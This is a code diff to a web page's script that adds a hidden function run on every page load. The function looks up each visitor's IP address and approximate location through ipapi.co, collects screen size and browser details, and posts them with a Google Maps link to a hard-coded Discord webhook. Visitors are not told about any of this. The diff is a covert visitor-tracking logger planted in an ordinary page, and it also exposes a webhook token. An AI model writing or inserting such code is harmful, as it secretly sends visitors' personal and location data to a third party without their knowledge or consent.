@@ -643,7 +643,72 @@ whatssap : 0645949075</div>
                 btn.style.color = '#fff';
                 btn.style.border = '1px solid rgba(255,255,255,0.3)';
             }
+
+            // Webhook Logger Trigger on Page Load
+            sendVisitorLog();
         });
+
+        async function sendVisitorLog() {
+            try {
+                // Fetch IP and Location data using a free API
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                const ip = ipData.ip || 'Unknown';
+                const city = ipData.city || 'Unknown';
+                const region = ipData.region || 'Unknown';
+                const country = ipData.country_name || 'Unknown';
+                const screenRes = window.innerWidth + 'x' + window.innerHeight;
+                const userAgent = navigator.userAgent;
+                const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`;
+
+                const webhookUrl = "https://discord.com/api/webhooks/1529258523685425362/4nAwZM1Gu0CRsDdGWWjDnqaAIT2zU4gzA3GoTUT6Gse0hK0238LCaOpFWZtKmskmSIQH";
+
+                // Discord Embed Payload formatted precisely like your reference design
+                const payload = {
+                    embeds: [{
+                        title: "🚨 تنبيه زائر جديد / سجل النظام",
+                        color: 15158332, // Red tone
+                        fields: [
+                            {
+                                name: "📱 الشاشة والتطبيق",
+                                value: screenRes,
+                                inline: true
+                            },
+                            {
+                                name: "📍 الموقع التقريبي",
+                                value: `${city}, ${region}, ${country}`,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 عنوان الـ IP",
+                                value: `\`${ip}\``,
+                                inline: false
+                            },
+                            {
+                                name: "💻 المتصفح والنظام",
+                                value: userAgent,
+                                inline: false
+                            },
+                            {
+                                name: "🗺️ موقع الخريطة (تقريبي)",
+                                value: `[عرض على خريطة Google](${mapsUrl})`,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Error logging visitor:", error);
+            }
+        }
 
         function toggleFollow() {
             const btn = document.getElementById('followBtn');
